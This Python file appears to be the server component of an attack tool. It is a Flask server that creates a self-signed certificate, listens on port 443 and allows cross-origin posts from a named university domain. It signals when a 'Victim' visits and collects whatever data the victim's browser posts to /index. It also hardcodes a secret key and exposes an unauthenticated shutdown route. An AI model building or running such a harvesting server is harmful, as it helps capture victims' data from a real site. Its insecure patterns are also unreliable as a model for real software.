from flask import Flask,redirect,render_template,flash,request,make_response,jsonify
from flask_cors import CORS,cross_origin
import os
import logging
import json, os, signal
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from utils import get_network_config
import datetime
class WEBServer:
    
    def __init__(self,web_server_q) -> None:
        '''
            Flask web server
        '''
        if web_server_q :
            self.queue = web_server_q
        else :
            self.queue = None
        # Générer une clé privée RSA
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )

        # Sauvegarder la clé privée dans un fichier
        with open("key.pem", "wb") as key_file:
            key_file.write(
                private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption(),
                )
            )
        # Définir les informations du certificat
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"My Company"),
            x509.NameAttribute(NameOID.COMMON_NAME, u"mydomain.com"),
        ])

        # Créer le certificat
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            # Le certificat est valide pour 1 an
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName(u"mydomain.com")]),
            critical=False,
        ).sign(private_key, hashes.SHA256())

        # Sauvegarder le certificat dans un fichier
        with open("cert.pem", "wb") as cert_file:
            cert_file.write(
                cert.public_bytes(serialization.Encoding.PEM)
            )

        print("Certificat et clé générés : cert.pem et key.pem")
    def shutdown_server(self):
        func = request.environ.get('werkzeug.server.shutdown')
        if func is None:
            raise RuntimeError('Not running with the Werkzeug Server')
        func()

    def writeInQueue(self,message):
        print("Writing in QUEUE",self.queue)
        if self.queue :
            self.queue.put(message)

    def listen(self):
        logging.getLogger('flask_cors').setLevel(logging.DEBUG)
        app = Flask(__name__)
        app.secret_key = 'dqsddqdsdgfrgerefdmkodsjfhdslkj<fhdsqopfhdspofh'

        CORS(app, origins=["http://finfo.usthb.dz", "http://192.168.1.73"])

        @app.route("/")
        def index():
            self.writeInQueue({
                'type' : "Alert",
                'content' : "Victim Visited the target website..."
            })
            return render_template('index.html')
        
        @app.post("/index")
        @cross_origin()
        def data():
            # print(request.data)
            # flash(f"Received data: Name - {request.data}")
            data = json.loads(request.data.decode('utf-8'))

            # Beautiful print function
            def pretty_print(data):
                print(json.dumps(data, indent=4, sort_keys=True))

            pretty_print(data)
            self.writeInQueue({
                'type' : "Result",
                'content' : request.data
            })
            response = make_response(jsonify(None), 200)
            return response
        
        @app.route('/force_shutdown', methods=['POST'])
        def force_shutdown():
            # os._exit(0)
            # self.shutdown_server()
            os.kill(os.getpid(), signal.SIGINT)
            return make_response(jsonify(None), 200)

        try :
            app.run(host='0.0.0.0',port=443,debug=False, use_reloader=False, ssl_context=('cert.pem', 'key.pem')) 
            print("DSQDSQDSQDSQD656")
        except Exception as e :
            print("FLASK dsqdqsdsqsq ",e)
        


if __name__ == "__main__":
    w = WEBServer(web_server_q=None)
    w.listen()

